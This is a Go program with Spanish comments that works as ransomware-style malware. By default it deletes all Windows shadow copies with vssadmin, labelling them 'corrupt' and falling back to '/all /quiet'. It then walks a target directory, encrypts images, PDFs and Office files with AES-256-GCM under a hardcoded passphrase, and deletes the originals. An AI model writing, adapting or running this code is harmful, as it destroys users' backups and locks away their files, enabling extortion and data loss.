package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"flag"
	"fmt"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
)

var validExts = map[string]bool{
	".jpg":  true,
	".jpeg": true,
	".png":  true,
	".gif":  true,
	".docx": true,
	".xlsx": true,
	".pptx": true,
	".pdf":  true,
}

// Formato de archivo cifrado
const (
	magicHeader = "ENCv1" // identificador (5 bytes)
	nonceSize   = 12      // GCM standard nonce size
	keySize     = 32      // AES-256
)

// --------------------- Operación VSS (Shadow Copies) ---------------------

// listShadows ejecuta "vssadmin list shadows" y devuelve los IDs encontrados.
func listShadows() ([]string, error) {
	cmd := exec.Command("vssadmin", "list", "shadows")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("vssadmin list shadows error: %w - output: %s", err, string(out))
	}

	text := string(out)
	lines := strings.Split(text, "\n")
	var ids []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Shadow Copy ID:") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				id := strings.TrimSpace(parts[1])
				ids = append(ids, id)
			}
		}
	}

	// Fallback: buscar GUIDs en el output
	if len(ids) == 0 {
		re := regexp.MustCompile(`\{[0-9A-Fa-f\-]{36}\}`)
		matches := re.FindAllString(text, -1)
		for _, m := range matches {
			ids = append(ids, m)
		}
	}

	return ids, nil
}

// deleteShadowByID intenta eliminar una sombra por su ID.
func deleteShadowByID(id string) error {
	param := "/shadow=" + id
	cmd := exec.Command("vssadmin", "delete", "shadows", param, "/quiet")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("error borrando shadow %s: %w - output: %s", id, err, string(out))
	}
	return nil
}

// DeleteCorruptShadows lista las sombras y las elimina una por una.
// No hay forma fiable de distinguir "corruptas" desde vssadmin; aquí intentamos eliminar todas y loguear errores.
func DeleteCorruptShadows() {
	log.Println("Listando copias shadow...")
	ids, err := listShadows()
	if err != nil {
		log.Printf("Error listando sombras: %v\n", err)
		log.Println("Intentando eliminar todas las sombras con /all como fallback...")
		cmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
		out, e2 := cmd.CombinedOutput()
		if e2 != nil {
			log.Fatalf("No se pudo eliminar con /all: %v - output: %s", e2, string(out))
		}
		log.Println("Se eliminaron todas las sombras (/all) correctamente.")
		return
	}

	if len(ids) == 0 {
		log.Println("No se encontraron copias shadow.")
		return
	}

	for _, id := range ids {
		log.Printf("Intentando borrar shadow: %s ...\n", id)
		if err := deleteShadowByID(id); err != nil {
			log.Printf("⚠️ Error al borrar %s: %v\n", id, err)
		} else {
			log.Printf("✅ Borrado: %s\n", id)
		}
	}
}

// --------------------- Recorrido de directorio (listado de ficheros) ---------------------

// ListFiles recorre root y devuelve rutas de archivos que coinciden con validExts.
func ListFiles(root string) ([]string, error) {
	var found []string
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			log.Printf("⚠️ Error accediendo a %s: %v\n", path, err)
			return nil // continuar
		}
		if d.IsDir() {
			return nil
		}
		ext := strings.ToLower(filepath.Ext(d.Name()))
		if validExts[ext] {
			found = append(found, path)
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return found, nil
}

// --------------------- Cifrado AES-GCM (sin salt) ---------------------

// deriveKeyDirect deriva la clave AES-256 como SHA256(passphrase).
func deriveKeyDirect(passphrase string) []byte {
	h := sha256.Sum256([]byte(passphrase))
	// h es [32]byte, devolvemos slice de 32 bytes
	return h[:]
}

// EncryptFile cifra path -> path + ".enc". Devuelve error si falla.
// Formato: magicHeader (5) + nonce (12) + ciphertext
func EncryptFile(path string, passphrase string, removeOriginal bool) error {
	plaintext, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("leer archivo: %w", err)
	}

	key := deriveKeyDirect(passphrase)

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("aes.NewCipher: %w", err)
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("cipher.NewGCM: %w", err)
	}

	nonce := make([]byte, nonceSize)
	if _, err := rand.Read(nonce); err != nil {
		return fmt.Errorf("generar nonce: %w", err)
	}

	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)

	outPath := path + ".enc"
	f, err := os.OpenFile(outPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("crear archivo salida: %w", err)
	}
	defer f.Close()

	// escribir header (magic + nonce + ciphertext)
	if _, err := f.Write([]byte(magicHeader)); err != nil {
		return fmt.Errorf("escribir magic: %w", err)
	}
	if _, err := f.Write(nonce); err != nil {
		return fmt.Errorf("escribir nonce: %w", err)
	}
	if _, err := f.Write(ciphertext); err != nil {
		return fmt.Errorf("escribir ciphertext: %w", err)
	}

	if removeOriginal {
		if err := os.Remove(path); err != nil {
			return fmt.Errorf("eliminar original: %w", err)
		}
	}

	return nil
}

// EncryptFilesInList cifra una lista de archivos con la passphrase indicada.
func EncryptFilesInList(files []string, passphrase string, removeOriginal bool) {
	for _, f := range files {
		log.Printf("🔒 Cifrando: %s\n", f)
		if err := EncryptFile(f, passphrase, removeOriginal); err != nil {
			log.Printf("❌ Error cifrando %s: %v\n", f, err)
		} else {
			log.Printf("✅ OK: %s -> %s.enc\n", f, f)
		}
	}
}

// --------------------- Main / CLI simple ---------------------

func main() {
	var (
		doDeleteShadows = flag.Bool("delete-shadows", true, "Listar y eliminar copias shadow (vssadmin). Requiere privilegios de administrador.")
		doList          = flag.Bool("list", true, "Listar ficheros con extensiones permitidas en el directorio raíz especificado.")
		doEncrypt       = flag.Bool("encrypt", true, "Cifrar los ficheros encontrados en el directorio raíz especificado.")
		rootDir         = flag.String("root", "", "Directorio raíz a recorrer (obligatorio para --list o --encrypt).")
		removeOriginal  = flag.Bool("remove-original", true, "Si se usa con --encrypt, borra los archivos originales tras cifrar.")
		passphrase      = flag.String("pass", "comoMolo", "Passphrase para derivar la clave AES (por defecto 'comoMolo').")
	)
	flag.Parse()

	if *doDeleteShadows {
		DeleteCorruptShadows()
	}

	if *doList || *doEncrypt {
		if *rootDir == "" {
			log.Fatal("Si usas --list o --encrypt, debes indicar --root=C:\\ruta\\al\\directorio")
		}

		log.Printf("Recorriendo: %s\n", *rootDir)
		files, err := ListFiles(*rootDir)
		if err != nil {
			log.Fatalf("Error recorriendo directorio: %v\n", err)
		}

		if *doList {
			if len(files) == 0 {
				log.Println("No se encontraron ficheros con las extensiones indicadas.")
			} else {
				log.Println("Ficheros encontrados:")
				for _, f := range files {
					fmt.Println(f)
				}
			}
		}

		if *doEncrypt {
			if len(files) == 0 {
				log.Println("No hay archivos a cifrar.")
			} else {
				EncryptFilesInList(files, *passphrase, *removeOriginal)
			}
		}
	}

	if !*doDeleteShadows && !*doList && !*doEncrypt {
		flag.Usage()
	}
}
